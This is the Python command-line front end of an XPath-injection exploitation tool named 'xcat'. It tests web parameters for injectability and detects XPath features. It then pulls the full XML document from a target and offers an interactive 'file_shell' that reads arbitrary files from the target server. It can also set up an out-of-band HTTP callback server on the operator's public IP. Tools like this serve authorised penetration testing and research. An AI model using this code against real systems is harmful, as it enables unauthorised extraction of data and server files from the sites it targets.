import asyncio

import click
import colorama
import logbook
import ipgetter

from .lib.requests.injectors import get_all_injectors
from .lib.executors import xpath1, xpath2, docfunction
from .lib.features.oob_http import OOBDocFeature
from .lib.features.doc import DocFeature
from .lib.features.xpath_2 import XPath2
from .lib.features.entity_injection import EntityInjection
from .lib.xpath import E, N, document_uri, doc
from .lib.output import XMLOutput, JSONOutput
from .lib.requests import detector
from .lib.requests.requester import RequestMaker
from .lib.oob.http import OOBHttpServer


colorama.init()


@click.group()
@click.argument("target")
@click.argument("arguments")
@click.argument("target_parameter")
@click.argument("match_string")
@click.option("--method", help="HTTP method to use", default="POST")

@click.option("--true", "detection_method", flag_value="true", default=True, help="match_string indicates a true response")
@click.option("--false", "detection_method", flag_value="false", help="match_string indicates a false response")
#@click.option("--error", "detection_method", flag_value="error", help="match_string indicates an error response")

@click.option("--loglevel", type=click.Choice(["debug", "info", "warn", "error"]), default="error")
@click.option("--logfile", type=click.File("wb", encoding="utf-8"), default="-")

@click.option("--public-ip", help="Public IP address to use with OOB connections (use 'autodetect' to auto-detect value)")
@click.pass_context
def xcat(ctx, target, arguments, target_parameter, match_string, method, detection_method, loglevel, logfile, public_ip):
    null_handler = logbook.NullHandler()
    null_handler.push_application()

    out_handler = logbook.StreamHandler(logfile, level=getattr(logbook, loglevel.upper()))
    out_handler.push_application()

    if detection_method == "true":
        checker = lambda r, b: match_string in b
    else:
        checker = lambda r, b: not match_string in b

    public_ip, public_port = public_ip.split(":") if public_ip and ":" in public_ip else (public_ip, "0")
    if not public_port.isdigit():
        print("Error: Port is not a number")
        ctx.exit(-1)

    public_port = int(public_port)

    if public_ip == "autodetect":
        try:
            public_ip = ipgetter.IPgetter().get_externalip()
        except Exception:
            click.echo("Could not detect public IP, please explicitly specify")
            ctx.exit()
        click.echo("External IP: {}".format(public_ip))

    if public_ip is not None:
        # Hack Hack Hack:
        # Setup an OOB http server instance on the doc feature class
        OOBDocFeature.server = OOBHttpServer(host=public_ip, port=public_port)

    ctx.obj["target_param"] = target_parameter
    request_maker = RequestMaker(target, method, arguments, target_parameter if target_parameter != "*" else None, checker=checker)
    ctx.obj["detector"] = detector.Detector(checker, request_maker)



@xcat.group()
@click.option("--injector", type=click.Choice(["autodetect"] + list(get_all_injectors().keys())),
              default="autodetect", help="Type of injection to use.")
@click.option("--xversion", type=click.Choice(["autodetect", "1","2"]),
              default="autodetect", help="XPath version to use")
@click.pass_context
def run(ctx, injector, xversion):
    if ctx.obj["target_param"] == "*":
        click.echo("Please specify a valid target parameter!")
        ctx.exit(1)

    detector = ctx.obj["detector"]

    if injector == "autodetect":
        injectors = run_then_return(get_injectors(detector, with_features=False))
        if len(injectors) == 0:
            click.echo("Could not autodetect a suitable injection, please explicitly specify")
            ctx.exit(1)
        elif len(injectors) > 1:
            click.echo("Multiple ways to inject parameter, please specify.")
            click.echo("Injectors: " + ", ".join([i.name() for i in injectors]))
            click.echo("Run test_injection for more info")
            ctx.exit(1)
        injector = list(injectors.keys())[0]
    else:
        injector = get_all_injectors()[injector]

    click.echo("Injecting using {}".format(injector.name()))

    click.echo("Detecting features...")
    features = run_then_return(detector.detect_features(injector))
    click.echo("Supported features: {}".format(", ".join(feature.NAME for feature in features)))

    if XPath2 not in features and xversion == "2":
        click.echo("XPath version specified as 2 but could not detect XPath2 support. Will try anyway")

    executor = xpath1.XPath1Executor

    if xversion == "autodetect" and XPath2 in features:
        executor = xpath2.XPath2Executor
    elif xversion == "2":
        executor = xpath2.XPath2Executor

    if OOBDocFeature in features:
        executor = docfunction.DocFunctionExecutor

    ctx.obj["injector"] = injector
    ctx.obj["requester"] = detector.get_requester(injector, features=features)
    ctx.obj["executor"] = executor(ctx.obj["requester"])


@run.command(help="Attempt to retrieve the whole XML document")
@click.option("--query", default="/*[1]", help="Query to retrieve. Defaults to root node (/*[1])")
@click.option("--output", type=click.File('wb'), default="-", help="Location to output XML to")
@click.option("--format", type=click.Choice(["xml", "json"]), default="xml", help="Format for output")
@click.pass_context
def retrieve(ctx, query, output, format):
    click.echo("Retrieving {}".format(query))
    executor = ctx.obj["executor"]

    output_class = XMLOutput if format == "xml" else JSONOutput
    run_then_return(display_results(output_class(output), executor, E(query)))


@run.command(help="Read arbitrary files from the filesystem")
@click.pass_context
def file_shell(ctx):
    requester = ctx.obj["requester"]
    click.echo("These are the types of files you can read:")
    if requester.has_feature(EntityInjection):
        click.echo(" * Arbitrary text files that do not contain XML, or files that do and do not contain '-->'")
    if requester.has_feature(DocFeature):
        click.echo(" * Local XML files")
    if requester.has_feature(OOBDocFeature):
        click.echo(" * Valid XML files available over the network")

    # ToDo: Make this more like a shell, with a current directory etc. Make it more usable :)
    click.echo("There are three ways to read files on the file system using XPath:")
    click.echo(" 1. inject: Can read arbitrary text files as long as they do not contain any XML")
    click.echo(" 2. comment: Can read arbitrary text files containing XML snippets, but cannot contain '-->'")
    click.echo(" 3. doc: Reads valid XML files - does not support any other file type. Supports remote file URI's (http) and local ones.")
    click.echo("Type doc, inject or comment to switch modes. Defaults to inject")
    click.echo("Type uri to read the URI of the document being queried")
    click.echo("Note: The URI should have a protocol prefix. Bad things may happen if the URI does not exist, and it is best to use absolute paths.")
    click.echo("When using the example application use 'file:' as a prefix, not 'file://'.")

    try:
        entity_injection = ctx.obj["requester"].get_feature(EntityInjection)
    except Exception:
        entity_injection = None

    # ToDo: Make doc injection verify that the files exist
    commands = {
        "doc": lambda p: run_then_return(display_results(XMLOutput(), ctx.obj["executor"], doc(p).add_path("/*[1]"))),
        "inject": lambda p: click.echo(run_then_return(entity_injection.get_file(ctx.obj["requester"], file_path))),
        "comment": lambda p: click.echo(run_then_return(entity_injection.get_file(ctx.obj["requester"], file_path, True))),
    }
    numbers = {
        "1": "inject",
        "2": "comment",
        "3": "doc"
    }
    mode = "inject"

    while True:
        file_path = click.prompt(">> ", prompt_suffix="")
        if file_path == "exit":
            ctx.exit()

        if file_path == "uri":
            executor = ctx.obj["executor"]
            uri = run_then_return(
                executor.get_string(document_uri(N("/")))
            )
            click.echo("URI: {}".format(uri))
        elif file_path in commands or file_path in numbers:
            if file_path in numbers:
                file_path = numbers[file_path]
            mode = file_path
            click.echo("Switched to {}".format(mode))
        else:
            try:
                commands[mode](file_path)
            except KeyboardInterrupt:
                click.echo("Command cancelled, CTRL+C again to terminate")
            except Exception as e:
                import traceback
                click.echo("Error reading file. Try another mode: {0}".format(e))



@run.command(help="Get the URI of the document being queried")
@click.pass_context
def get_uri(ctx):
    click.echo("Retrieving URI...")
    executor = ctx.obj["executor"]
    uri = run_then_return(
        executor.get_string(document_uri(N("/")))
    )
    click.echo("URI: {}".format(uri))

@xcat.command(help="Test parameter for injectability")
@click.pass_context
def test_injection(ctx):
    detector = ctx.obj["detector"]

    if ctx.obj["target_param"] == "*":
        params = detector.requests.get_url_parameters()
    else:
        params = [ctx.obj["target_param"]]

    for param in params:
        click.echo("Testing parameter {}{}{}:".format(colorama.Fore.RED, param, colorama.Fore.RESET))
        detector = detector.change_parameter(param)

        injectors = run_then_return(get_injectors(detector, with_features=True))

        if len(injectors) == 0:
            click.echo("Could not inject into parameter. Are you sure it is vulnerable?")

        for injector, features in injectors.items():
            injector_example = "{}:\t\t{}".format(injector.__class__.__name__, injector.example)\
                .replace("?", colorama.Fore.GREEN + "?" + colorama.Fore.RESET)
            click.echo(injector_example)

            for feature in features:
                click.echo("\t- {}".format(feature.__name__))


@asyncio.coroutine
def get_injectors(detector, with_features=False):
    injectors = yield from detector.detect_injectors()
    if not with_features:
        return {i: [] for i in injectors}
    # Doesn't work it seems. Shame :(
    #return{injector: (yield from detector.detect_features(injector))
    #        for injector in injectors}
    returner = {}
    for injector in injectors:
        returner[injector] = (yield from detector.detect_features(injector))
    return returner


@asyncio.coroutine
def display_results(output, executor, target_node, first=True):
    if first:
        output.output_started()

    children = []
    node = yield from executor.retrieve_node(target_node)
    output.output_start_node(node)

    if node.child_count > 0:
        for child in target_node.children(node.child_count):
            children.append((yield from display_results(output, executor, child, first=False)))

    output.output_end_node(node)
    data = node._replace(children=children)

    if first:
        output.output_finished()

    return data


def run_then_return(generator):
    future = asyncio.Task(generator)
    asyncio.get_event_loop().run_until_complete(future)
    return future.result()


def run():
    xcat(obj={})

if __name__ == "__main__":
    try:
        run()
    except Exception as e:
        print("Error: {}".format(e))
        import sys
        sys.exit(-1)